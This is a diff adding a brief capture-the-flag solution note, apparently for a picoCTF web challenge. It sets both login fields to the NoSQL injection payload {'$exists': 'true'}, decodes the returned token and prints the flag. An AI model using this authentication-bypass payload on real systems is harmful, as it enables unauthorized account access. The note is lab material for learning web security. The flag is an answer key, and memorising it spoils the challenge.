@@ -1,0 +1,12 @@
+turn on record network traffic in inspect
+
+username:
+{"$exists": "true"}
+
+password:
+{"$exists": "true"}
+
+look at response from /app/login POST:
+grab token, run through base64decode.org
+
+picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_f2f185f2}
